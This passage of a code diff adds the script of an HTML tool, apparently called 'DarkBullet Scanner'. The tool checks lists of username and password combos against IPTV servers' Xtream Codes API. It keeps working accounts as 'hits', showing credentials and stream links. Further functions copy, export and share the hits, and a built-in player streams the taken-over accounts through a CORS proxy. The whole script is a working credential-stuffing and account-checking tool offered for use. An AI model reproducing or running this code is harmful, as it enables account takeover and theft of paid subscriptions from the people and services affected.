+            let porta = "80";
+            let hostSemPorta = host;
+            if (host.includes(':')) {
+                [hostSemPorta, porta] = host.split(':');
+            }
+            
+            // Validação da combo
+            const urlUserInfo = `http://${hostSemPorta}:${porta}/player_api.php?username=${user}&password=${pass}`;
+            const resUserInfo = await fetchWithTimeout(urlUserInfo);
+            if (!resUserInfo.ok) return null;
+            
+            const dataUser = await resUserInfo.json();
+            if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) return null;
+            
+            const info = dataUser.user_info;
+            
+            // Pega dados adicionais
+            const streamData = await fetchStreamData(hostSemPorta, user, pass);
+            
+            // Formata data expiração
+            const expira = unixToFormattedDate(info.exp_date);
+            
+            // Links formatados
+            const m3u_plus = `http://${hostSemPorta}:${porta}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
+            const mpeg = `http://${hostSemPorta}:${porta}/get.php?username=${user}&password=${pass}&type=m3u&output=mpegts`;
+            const hls = `http://${hostSemPorta}:${porta}/get.php?username=${user}&password=${pass}&type=m3u&output=hls`;
+            const epg = `http://${hostSemPorta}:${porta}/xmltv.php?username=${user}&password=${pass}`;
+            
+            return {
+                host: hostSemPorta,
+                user,
+                pass,
+                status: info.status,
+                created_at: unixToFormattedDate(info.created_at),
+                exp_date: expira,
+                max_connections: info.max_connections || 'N/A',
+                active_cons: info.active_cons || 'N/A',
+                is_trial: info.is_trial || 'N/A',
+                timezone: info.timezone || 'N/A',
+                m3u_plus,
+                mpeg,
+                hls,
+                epg,
+                canais: streamData.canais.length,
+                categorias: streamData.categorias
+            };
+        }
+        
+        async function fetchStreamData(host, user, pass) {
+            const baseUrl = `http://${host}`;
+            const data = { canais: [], categorias: "" };
+            
+            async function fetchJson(url) {
+                try {
+                    const res = await fetchWithTimeout(url);
+                    if(!res.ok) return [];
+                    return await res.json();
+                } catch {
+                    return [];
+                }
+            }
+            
+            try {
+                data.canais = await fetchJson(`${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`);
+                
+                // Categorias
+                const catRes = await fetchWithTimeout(`${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_live_categories`);
+                if(catRes.ok) {
+                    const txt = await catRes.text();
+                    const matches = [...txt.matchAll(/"category_name":"(.*?)"/g)];
+                    if(matches.length) {
+                        data.categorias = matches.map(m => m[1]).join(" 🎬 ");
+                    } else {
+                        data.categorias = "Nenhuma encontrada";
+                    }
+                } else {
+                    data.categorias = "Nenhuma encontrada";
+                }
+            } catch {
+                data.categorias = "Nenhuma encontrada";
+            }
+            
+            return data;
+        }
+        
+        function fetchWithTimeout(url, timeout = 5000) {
+            return new Promise((resolve, reject) => {
+                const controller = new AbortController();
+                const signal = controller.signal;
+                
+                const timer = setTimeout(() => {
+                    controller.abort();
+                    reject(new Error('Timeout'));
+                }, timeout);
+                
+                fetch(url, { signal })
+                    .then(response => {
+                        clearTimeout(timer);
+                        resolve(response);
+                    })
+                    .catch(err => {
+                        clearTimeout(timer);
+                        reject(err);
+                    });
+            });
+        }
+        
+        function unixToFormattedDate(unixTimestamp) {
+            if (!unixTimestamp) return 'N/A';
+            const date = new Date(unixTimestamp * 1000);
+            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+        }
+        
+        function displayResult(result) {
+            const resultElement = document.createElement('div');
+            resultElement.className = 'result-item';
+            
+            resultElement.innerHTML = `
+                <div class="result-header">
+                    <h3 class="result-title">HIT ENCONTRADO</h3>
+                    <div>
+                        <button class="btn btn-sm btn-success copy-hit-btn" data-result='${JSON.stringify(result).replace(/'/g, "\\'")}'>Copiar Hit</button>
+                        <button class="btn btn-sm btn-info play-hit-btn" data-result='${JSON.stringify(result).replace(/'/g, "\\'")}'>Reproduzir</button>
+                    </div>
+                </div>
+                
+                <div class="result-content">
+                    <div class="result-field">
+                        <span class="field-label">Status:</span>
+                        <span class="field-value">${result.status}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Servidor:</span>
+                        <span class="field-value">${result.host}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Usuário:</span>
+                        <span class="field-value">${result.user}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Senha:</span>
+                        <span class="field-value">${result.pass}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Conexões:</span>
+                        <span class="field-value">${result.active_cons}/${result.max_connections}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Registro:</span>
+                        <span class="field-value">${result.created_at}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Validade:</span>
+                        <span class="field-value">${result.exp_date}</span>
+                    </div>
+                    
+                    ${showCategories ? `
+                    <div class="divider"></div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Canais:</span>
+                        <span class="field-value">${result.canais}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">Categorias:</span>
+                        <span class="field-value">${result.categorias}</span>
+                    </div>
+                    ` : ''}
+                    
+                    <div class="divider"></div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">M3U+:</span>
+                        <span class="field-value">${result.m3u_plus}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">MPEG-TS:</span>
+                        <span class="field-value">${result.mpeg}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">HLS:</span>
+                        <span class="field-value">${result.hls}</span>
+                    </div>
+                    
+                    <div class="result-field">
+                        <span class="field-label">EPG:</span>
+                        <span class="field-value">${result.epg}</span>
+                    </div>
+                </div>
+            `;
+            
+            resultsList.prepend(resultElement);
+            
+            // Adicionar evento de clique ao botão de copiar
+            resultElement.querySelector('.copy-hit-btn').addEventListener('click', function() {
+                const resultData = JSON.parse(this.getAttribute('data-result'));
+                copyResultToClipboard(resultData);
+            });
+            
+            // Adicionar evento de clique ao botão de reproduzir
+            resultElement.querySelector('.play-hit-btn').addEventListener('click', function() {
+                const resultData = JSON.parse(this.getAttribute('data-result'));
+                openPlayer(resultData);
+            });
+            
+            // Adicionar evento de clique no item inteiro para reproduzir
+            resultElement.addEventListener('click', function(e) {
+                // Ignorar cliques nos botões
+                if (e.target.classList.contains('btn') || e.target.closest('.btn')) {
+                    return;
+                }
+                
+                const resultData = JSON.parse(this.querySelector('.play-hit-btn').getAttribute('data-result'));
+                openPlayer(resultData);
+            });
+        }
+        
+        function copyResultToClipboard(result) {
+            let text;
+            
+            if (showCategories) {
+                text = `HIT ENCONTRADO
+------------------------------
+✅Status: ${result.status}
+🌍Servidor: ${result.host}
+💁Usuário: ${result.user}
+🔐Senha: ${result.pass}
+🙋Conexões: ${result.active_cons}/${result.max_connections}
+📅Registro: ${result.created_at}
+📆Validade: ${result.exp_date}
+------------------------------
+📺 CANAIS: ${result.canais}
+🏷️ CATEGORIAS: ${result.categorias}
+------------------------------
+📎M3U+: ${result.m3u_plus}
+📎MPEG-TS: ${result.mpeg}
+📎HLS: ${result.hls}
+📎EPG: ${result.epg}
+------------------------------
+DarkBullet Scanner`;
+            } else {
+                text = `HIT ENCONTRADO
+------------------------------
+╭─✅Status: ${result.status}
+╟🌍Servidor: ${result.host}
+╟💁Usuário: ${result.user}
+╟🔐Senha: ${result.pass}
+╟🙋Conexões: ${result.active_cons}/${result.max_connections}
+╟📅Registro: ${result.created_at}
+╰─📆Validade: ${result.exp_date}
+------------------------------
+├●📎M3U+: ${result.m3u_plus}
+├●📎MPEG-TS: ${result.mpeg}
+├●📎HLS: ${result.hls}
+├●📎EPG: ${result.epg}
+------------------------------
+├●📩DarkBullet Scanner`;
+            }
+            
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('Resultado copiado!', 'success');
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+                showNotification('Erro ao copiar resultado', 'error');
+            });
+        }
+        
+        function copyAllResults() {
+            if (results.length === 0) {
+                showNotification('Nenhum resultado para copiar!', 'error');
+                return;
+            }
+            
+            let text = '';
+            results.forEach((result, index) => {
+                if (showCategories) {
+                    text += `HIT ENCONTRADO #${index + 1}
+------------------------------
+✅Status: ${result.status}
+🌍Servidor: ${result.host}
+💁Usuário: ${result.user}
+🔐Senha: ${result.pass}
+🙋Conexões: ${result.active_cons}/${result.max_connections}
+📅Registro: ${result.created_at}
+📆Validade: ${result.exp_date}
+------------------------------
+📺 CANAIS: ${result.canais}
+🏷️ CATEGORIAS: ${result.categorias}
+------------------------------
+📎M3U+: ${result.m3u_plus}
+📎MPEG-TS: ${result.mpeg}
+📎HLS: ${result.hls}
+📎EPG: ${result.epg}
+├●📩DarkBullet Scanner
+------------------------------\n\n`;
+                } else {
+                    text += `HIT ENCONTRADO #${index + 1}
+------------------------------
+╭─✅Status: ${result.status}
+╟🌍Servidor: ${result.host}
+╟💁Usuário: ${result.user}
+╟🔐Senha: ${result.pass}
+╟🙋Conexões: ${result.active_cons}/${result.max_connections}
+╟📅Registro: ${result.created_at}
+╰─📆Validade: ${result.exp_date}
+------------------------------
+├●📎M3U+: ${result.m3u_plus}
+├●📎MPEG-TS: ${result.mpeg}
+├●📎HLS: ${result.hls}
+├●📎EPG: ${result.epg}
+├●📩DarkBullet Scanner
+------------------------------\n\n`;
+                }
+            });
+            
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification(`${results.length} resultados copiados!`, 'success');
+            }).catch(err => {
+                console.error('Erro ao copiar todos:', err);
+                showNotification('Erro ao copiar resultados', 'error');
+            });
+        }
+        
+        function exportResultsToTxt() {
+            if (results.length === 0) {
+                showNotification('Nenhum resultado para exportar!', 'error');
+                return;
+            }
+            
+            let text = `DarkBullet Scanner - Resultados IPTV\n`;
+            text += `Data: ${new Date().toLocaleString()}\n`;
+            text += `Servidor: ${hostInput.value}\n`;
+            text += `Total de Hits: ${results.length}\n\n`;
+            
+            results.forEach((result, index) => {
+                text += `========== HIT #${index + 1} ==========\n`;
+                text += `🌍Servidor: ${result.host}\n`;
+                text += `💁Usuário: ${result.user}\n`;
+                text += `🔐Senha: ${result.pass}\n`;
+                text += `✅Status: ${result.status}\n`;
+                text += `🙋Conexões: ${result.active_cons}/${result.max_connections}\n`;
+                text += `📅Registro: ${result.created_at}\n`;
+                text += `📆Validade: ${result.exp_date}\n`;
+                
+                if (showCategories) {
+                    text += `📺Canais: ${result.canais}\n`;
+                    text += `🏷️Categorias: ${result.categorias}\n`;
+                }
+                
+                text += `📎M3U+: ${result.m3u_plus}\n`;
+                text += `📎MPEG-TS: ${result.mpeg}\n`;
+                text += `📎HLS: ${result.hls}\n`;
+                text += `📎EPG: ${result.epg}\n\n`;
+            });
+            
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `darkbullet-results-${new Date().toISOString().slice(0, 10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showNotification('Resultados exportados!', 'success');
+        }
+        
+        function shareResults() {
+            if (results.length === 0) {
+                showNotification('Nenhum resultado para compartilhar!', 'error');
+                return;
+            }
+            
+            let text = `DarkBullet Scanner - Resultados IPTV\n`;
+            text += `Data: ${new Date().toLocaleString()}\n`;
+            text += `Servidor: ${hostInput.value}\n`;
+            text += `Total de Hits: ${results.length}\n\n`;
+            
+            results.forEach(result => {
+                text += `HIT|${result.host}|${result.user}|${result.pass}|${result.exp_date}|${result.m3u_plus}|${result.epg}\n`;
+            });
+            
+            if (navigator.share) {
+                navigator.share({
+                    title: 'DarkBullet Scanner - Resultados IPTV',
+                    text: `Confira os ${results.length} hits encontrados!`,
+                    files: [new File([text], 'darkbullet-results.txt', { type: 'text/plain' })]
+                }).catch(err => {
+                    console.error('Erro ao compartilhar:', err);
+                    showNotification('Erro ao compartilhar', 'error');
+                });
+            } else {
+                showNotification('API de compartilhamento não suportada', 'warning');
+                exportResultsToTxt();
+            }
+        }
+        
+        function updateStats() {
+            const progress = (totalProcessed / combos.length) * 100;
+            progressFill.style.width = `${progress}%`;
+            progressText.textContent = `${progress.toFixed(1)}%`;
+            
+            totalSpan.textContent = totalProcessed;
+            hitsSpan.textContent = hitsCount;
+            errorsSpan.textContent = errorsCount;
+            speedSpan.textContent = requestsPerSecond;
+            activeSpan.textContent = activeThreads;
+            remainingSpan.textContent = combos.length - totalProcessed;
+        }
+        
+        function calculateRPS() {
+            const now = Date.now();
+            const elapsed = (now - lastRequestTime) / 1000;
+            requestsPerSecond = elapsed > 0 ? (1 / elapsed).toFixed(1) : 0;
+            lastRequestTime = now;
+            updateStats();
+        }
+        
+        function scanComplete() {
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            combosInput.disabled = false;
+            clearInterval(rpsInterval);
+            
+            if (!stopRequested) {
+                showNotification('Scan completo!', 'success');
+                playSound('complete');
+            }
+        }
+        
+        function showNotification(message, type) {
+            notification.textContent = message;
+            notification.className = 'notification';
+            notification.classList.add(type);
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        function playSound(type) {
+            if (type === 'success') {
+                successSound.currentTime = 0;
+                successSound.play();
+            } else if (type === 'error') {
+                errorSound.currentTime = 0;
+                errorSound.play();
+            } else if (type === 'complete') {
+                completeSound.currentTime = 0;
+                completeSound.play();
+            }
+        }
+        
+        function openHelpModal() {
+            helpModal.style.display = 'flex';
+        }
+        
+        function closeHelpModal() {
+            helpModal.style.display = 'none';
+        }
+        
+        // Funções do Player
+        
+        function openPlayer(result) {
+            // Extrair informações do link M3U
+            const url = new URL(result.m3u_plus);
+            xtreamConfig.baseUrl = `${url.protocol}//${url.hostname}`;
+            xtreamConfig.user = result.user;
+            xtreamConfig.pass = result.pass;
+            
+            // Mostrar modal do player
+            playerModal.style.display = 'flex';
+            
+            // Limpar cache
+            cache.live = [];
+            cache.live_cat = [];
+            
+            // Carregar dados iniciais
+            fetchInitialData();
+        }
+        
+        function closePlayerModal() {
+            playerModal.style.display = 'none';
+            destroyPlayer();
+        }
+        
+        // Função principal para carregar dados iniciais
+        async function fetchInitialData() {
+            const { baseUrl, user, pass } = xtreamConfig;
+            const baseApi = `${baseUrl}/player_api.php?username=${user}&password=${pass}`;
+            
+            try {
+                // Requisições paralelas para obter dados básicos
+                const [live, live_cat] = await Promise.all([
+                    fetchAPI(`${baseApi}&action=get_live_streams`),
+                    fetchAPI(`${baseApi}&action=get_live_categories`),
+                ]);
+                
+                // Processamento sem filtragem de conteúdo adulto
+                cache.live_cat = Array.isArray(live_cat) ? live_cat : [];
+                cache.live = Array.isArray(live) ? live : [];
+                
+                renderContent(activeContentType);
+            } catch (error) {
+                console.error("Erro ao carregar dados:", error);
+                playerLoading.innerHTML = `<p>Erro ao carregar dados: ${error.message}</p>`;
+            }
+        }
+        
+        // Função para buscar dados da API
+        async function fetchAPI(url) {
+            const CORS_PROXY = 'https://corsproxy.io/?';
+            const REQUEST_TIMEOUT = 20000;
+            
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);
+            
+            try {
+                const response = await fetch(CORS_PROXY + url, { 
+                    signal: controller.signal, 
+                    cache: 'no-store' 
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (!response.ok) {
+                    throw new Error(`API fetch failed (status ${response.status})`);
+                }
+                
+                const data = await response.json();
+                return (data === null || (typeof data === 'object' && !Array.isArray(data) && Object.keys(data).length === 0)) 
+                    ? [] 
+                    : data;
+            } catch (e) {
+                throw e;
+            }
+        }
+        
+        // Função para processar canais ao vivo
+        function processLiveStreams(streams, cats) {
+            const qualityRegex = /\s(SD|HD\+|FHD|UHD|4K|HEVC|H26[45]|HDR\+|HDR10|HDR|\+HD|HD|720P|1080P|\[H?26[45]\]|\bPOTÊNCIA\s?[\d¹²³⁴⁵⁶⁷⁸⁹])\b/i;
+            const qualityGroups = new Map();
+            
+            // Agrupar canais por nome (removendo sufixos de qualidade)
+            (streams || []).forEach(stream => {
+                const baseName = (stream.name || '').replace(qualityRegex, '').trim();
+                if (!qualityGroups.has(baseName)) {
+                    qualityGroups.set(baseName, []);
+                }
+                qualityGroups.get(baseName).push(stream);
+            });
+            
+            // Criar itens representativos para cada grupo
+            const allItems = Array.from(qualityGroups.values()).map(group => {
+                const representative = group.sort((a, b) => b.name.length - a.name.length)[0];
+                return {
+                    ...representative,
+                    name: representative.name.replace(qualityRegex, '').trim(),
+                    grouped_streams: group
+                };
+            });
+            
+            // Organizar por categoria
+            const itemsByCat = allItems.reduce((acc, item) => {
+                const catId = item.category_id || 'all';
+                (acc[catId] = acc[catId] || []).push(item);
+                return acc;
+            }, {});
+            
+            // Preparar lista de categorias
+            let catList = cats.filter(cat => itemsByCat[cat.category_id]);
+            if (itemsByCat['all']) {
+                catList.push({ category_id: 'all', category_name: 'Outros Canais' });
+            }
+            
+            return {
+                categories: sortCategories(catList),
+                itemsByCat: itemsByCat
+            };
+        }
+        
+        // Função para renderizar conteúdo
+        async function renderContent(type) {
+            playerLoading.style.display = 'flex';
+            playerContentList.innerHTML = '';
+            
+            try {
+                if (type === 'live') {
+                    // Processar canais ao vivo
+                    const liveData = processLiveStreams(cache.live, cache.live_cat);
+                    
+                    // Renderizar categorias e canais
+                    liveData.categories.forEach(category => {
+                        const categoryDiv = document.createElement('div');
+                        categoryDiv.className = 'player-category';
+                        
+                        const categoryHeader = document.createElement('div');
+                        categoryHeader.className = 'player-category-header';
+                        categoryHeader.innerHTML = `
+                            <div class="player-category-title">
+                                <i class="fas fa-chevron-down category-arrow"></i>
+                                ${category.category_name}
+                            </div>
+                            <div class="player-category-count">${liveData.itemsByCat[category.category_id]?.length || 0} canais</div>
+                        `;
+                        categoryDiv.appendChild(categoryHeader);
+                        
+                        const channelsContainer = document.createElement('div');
+                        channelsContainer.className = 'player-category-channels';
+                        
+                        const channels = liveData.itemsByCat[category.category_id] || [];
+                        channels.forEach(channel => {
+                            const channelDiv = document.createElement('div');
+                            channelDiv.className = 'player-channel';
+                            channelDiv.innerHTML = `
+                                <div class="player-channel-icon">
+                                    <i class="fas fa-tv"></i>
+                                </div>
+                                <div class="player-channel-name">${channel.name}</div>
+                            `;
+                            
+                            channelDiv.addEventListener('click', () => {
+                                document.querySelectorAll('.player-channel').forEach(c => c.classList.remove('active'));
+                                channelDiv.classList.add('active');
+                                setupPlayer(channel, 'live');
+                            });
+                            
+                            channelsContainer.appendChild(channelDiv);
+                        });
+                        
+                        categoryDiv.appendChild(channelsContainer);
+                        
+                        // Adicionar evento de clique na categoria para expandir/recolher
+                        categoryHeader.addEventListener('click', () => {
+                            categoryDiv.classList.toggle('expanded');
+                            const arrow = categoryHeader.querySelector('.category-arrow');
+                            if (categoryDiv.classList.contains('expanded')) {
+                                arrow.classList.remove('fa-chevron-down');
+                                arrow.classList.add('fa-chevron-up');
+                            } else {
+                                arrow.classList.remove('fa-chevron-up');
+                                arrow.classList.add('fa-chevron-down');
+                            }
+                        });
+                        
+                        playerContentList.appendChild(categoryDiv);
+                    });
+                }
+                
+                playerLoading.style.display = 'none';
+            } catch (error) {
+                console.error("Erro ao renderizar conteúdo:", error);
+                playerLoading.innerHTML = `<p>Erro ao carregar conteúdo: ${error.message}</p>`;
+            }
+        }
+        
+        // Função para ordenar categorias
+        function sortCategories(categories) {
+            // Ordenar por nome
+            return categories.sort((a, b) => {
+                const nameA = a.category_name.toLowerCase();
+                const nameB = b.category_name.toLowerCase();
+                
+                // Priorizar categorias comuns
+                const commonCategories = ['esportes', 'filmes', 'séries', 'documentários', 'notícias', 'infantil'];
+                const indexA = commonCategories.findIndex(cat => nameA.includes(cat));
+                const indexB = commonCategories.findIndex(cat => nameB.includes(cat));
+                
+                if (indexA !== -1 && indexB !== -1) {
+                    return indexA - indexB;
+                } else if (indexA !== -1) {
+                    return -1;
+                } else if (indexB !== -1) {
+                    return 1;
+                }
+                
+                return nameA.localeCompare(nameB);
+            });
+        }
+        
+        // Função principal para configurar o player
+        function setupPlayer(item, type, startAt = 0) {
+            destroyPlayer(); // Limpar instância anterior
+            
+            try {
+                playerContainer.innerHTML = '';
+                
+                // Criar elemento de vídeo
+                const video = document.createElement('video');
+                video.id = 'video-player';
+                video.playsinline = true;
+                video.controls = true;
+                video.crossOrigin = "anonymous";
+                playerContainer.appendChild(video);
+                
+                // Preparar URL do stream
+                const playbackId = type === 'live' 
+                    ? item.stream_id 
+                    : (item.stream_id || item.id);
+                    
+                const extension = type === 'live' 
+                    ? 'm3u8' 
+                    : (item.container_extension || 'mp4');
+                    
+                const { baseUrl, user, pass } = xtreamConfig;
+                let streamUrl = '';
+                
+                if (type === 'live') {
+                    streamUrl = `${baseUrl}/live/${user}/${pass}/${playbackId}.${extension}`;
+                } else {
+                    streamUrl = `${baseUrl}/movie/${user}/${pass}/${playbackId}.${extension}`;
+                }
+                
+                // Configurar HLS.js para streams M3U8
+                if (Hls.isSupported() && streamUrl.includes('.m3u8')) {
+                    hlsInstance = new Hls({
+                        capLevelToPlayerSize: true,
+                        maxBufferLength: 45,
+                        maxMaxBufferLength: 90,
+                        enableWorker: true,
+                        startLevel: -1,
+                        fragLoadingRetryDelay: 1000,
+                        fragLoadingMaxRetry: 4,
+                        levelLoadingRetryDelay: 1000,
+                        levelLoadingMaxRetry: 4
+                    });
+                    
+                    hlsInstance.loadSource(streamUrl);
+                    hlsInstance.attachMedia(video);
+                    
+                    // Tratamento de erros
+                    hlsInstance.on(Hls.Events.ERROR, (event, data) => {
+                        if (data.fatal) {
+                            switch (data.type) {
+                                case Hls.ErrorTypes.NETWORK_ERROR:
+                                case Hls.ErrorTypes.MEDIA_ERROR:
+                                    hlsInstance.destroy();
+                                    hlsInstance = null;
+                                    video.src = streamUrl;
+                                    video.play().catch(() => {
+                                        console.error("Falha ao iniciar reprodução");
+                                    });
+                                    break;
+                                default:
+                                    hlsInstance.destroy();
+                                    break;
+                            }
+                        }
+                    });
+                } else {
+                    video.src = streamUrl;
+                }
+                
+                // Inicializar Plyr
+                playerInstance = new Plyr(video, {
+                    settings: ['quality', 'speed', 'loop', 'pip'],
+                    i18n: {
+                        "speed": "Velocidade",
+                        "settings": "Ajustes",
+                        "controls": "Controles",
+                        "pip": "Picture-in-Picture"
+                    },
+                    tooltips: { controls: true }
+                });
+                
+                // Configurar eventos do player
+                playerInstance.on('ready', () => {
+                    // Adicionar botões personalizados
+                    addCustomControls(playerInstance);
+                    
+                    // Iniciar reprodução
+                    playerInstance.play();
+                });
+                
+                // Definir tempo inicial se especificado
+                if (startAt > 0) {
+                    playerInstance.once('canplay', () => {
+                        playerInstance.currentTime = startAt;
+                    });
+                }
+                
+            } catch (error) {
+                console.error("Erro ao configurar player:", error);
+                destroyPlayer();
+            }
+        }
+        
+        // Função para destruir o player
+        function destroyPlayer() {
+            if (playerInstance) {
+                try {
+                    playerInstance.destroy();
+                } catch(e) {}
+                playerInstance = null;
+            }
+            
+            if (hlsInstance) {
+                hlsInstance.destroy();
+                hlsInstance = null;
+            }
+        }
+        
+        // Função para adicionar controles personalizados ao player
+        function addCustomControls(playerInstance) {
+            const { plyr } = playerInstance.detail;
+            const controls = plyr.elements.controls;
+            const settingsBtn = controls.querySelector('[data-plyr="settings"]');
+            
+            if (!settingsBtn) return;
+            
+            // Botão de proporção de tela
+            const aspectBtn = document.createElement('button');
+            aspectBtn.type = 'button';
+            aspectBtn.className = 'plyr__control plyr-aspect-ratio-btn';
+            aspectBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21,3H3C1.9,3,1,3.9,1,5v14c0,1.1,0.9,2,2,2h18c1.1,0,2-0.9,2-2V5C23,3.9,22.1,3,21,3z M21,19H3V5h18V19z"/></svg>`;
+            aspectBtn.title = "Aspect Ratio";
+            
+            let currentRatio = 0;
+            const ratios = ['video-fit', 'video-fill', 'video-zoom'];
+            
+            aspectBtn.onclick = () => {
+                const video = document.getElementById('video-player');
+                video.classList.remove(ratios[currentRatio]);
+                currentRatio = (currentRatio + 1) % ratios.length;
+                video.classList.add(ratios[currentRatio]);
+            };
+            
+            // Botões de sincronização de áudio
+            const syncContainer = document.createElement('div');
+            syncContainer.style.cssText = 'display:flex; gap:5px;';
+            syncContainer.title = "Sincronia de Áudio";
+            
+            const syncMinus = document.createElement('button');
+            syncMinus.className = 'plyr__control';
+            syncMinus.innerHTML = `<i class="fa-solid fa-backward-fast"></i>`;
+            syncMinus.onclick = () => { video.currentTime -= 0.1; };
+            
+            const syncPlus = document.createElement('button');
+            syncPlus.className = 'plyr__control';
+            syncPlus.innerHTML = `<i class="fa-solid fa-forward-fast"></i>`;
+            syncPlus.onclick = () => { video.currentTime += 0.1; };
+            
+            syncContainer.append(syncMinus, syncPlus);
+            
+            // Inserir controles antes do botão de configurações
+            controls.insertBefore(aspectBtn, settingsBtn);
+            controls.insertBefore(syncContainer, settingsBtn);
+            
+            // Garantir que todos os botões sejam focáveis
+            controls.querySelectorAll('button').forEach(btn => {
+                btn.setAttribute('tabindex', '0');
+            });
+        }
+        
+        // Perfil do usuário (para salvar progresso)
+        let currentProfile = {
+            progress: {}
+        };
+        
+        // Função para salvar dados do perfil
+        function saveProfileData() {
+            localStorage.setItem('darkbullet_profile', JSON.stringify(currentProfile));
+        }
+        
+        // Função para carregar dados do perfil
+        function loadProfileData() {
+            const saved = localStorage.getItem('darkbullet_profile');
+            if (saved) {
+                currentProfile = JSON.parse(saved);
+            }
+        }
+        
+        // Carregar perfil ao iniciar
+        loadProfileData();
+        
+        // Efeito Matrix no fundo
+        function initMatrixEffect() {
+            const canvas = document.getElementById('matrix-bg');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const nums = '0123456789';
+            const symbols = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';
+            
+            const alphabet = katakana + latin + nums + symbols;
+            
+            const fontSize = 16;
+            const columns = canvas.width / fontSize;
+            
+            const rainDrops = [];
+            
+            for (let x = 0; x < columns; x++) {
+                rainDrops[x] = 1;
+            }
+            
+            const draw = () => {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#0F0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for (let i = 0; i < rainDrops.length; i++) {
+                    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                    ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                    
+                    if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        rainDrops[i] = 0;
+                    }
+                    rainDrops[i]++;
+                }
+            };
+            
+            setInterval(draw, 30);
+            
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        }
+    </script>
+</body>
+</html>
